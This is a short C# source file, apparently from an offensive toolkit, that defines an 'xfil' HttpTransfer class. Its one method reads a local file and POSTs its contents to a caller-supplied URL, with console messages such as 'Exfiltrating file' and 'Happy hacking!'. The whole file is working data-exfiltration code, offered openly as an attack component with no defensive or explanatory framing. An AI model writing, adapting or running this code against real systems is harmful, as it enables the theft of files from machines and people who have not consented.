using System;
using System.IO;
using System.Net;
using System.Text;

namespace xfil
{
    public class HttpTransfer
    {
        public static void Transfer(string url, string b64)
        {

            Console.WriteLine("[+] Preparing the exfil . . .");

            WebRequest request = WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "exfil go brrrr";

            Console.WriteLine("[+] Reading file . . .");
            string text_b64 = File.ReadAllText(b64);

            byte[] byteArray = Encoding.UTF8.GetBytes(text_b64);

            Console.WriteLine("[+] Exfiltrating file . . .");
            // Xfil file
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();


            request.GetResponse();

          
            Console.Write("\r\n[!] Done! Happy hacking!");

        }
    }
}
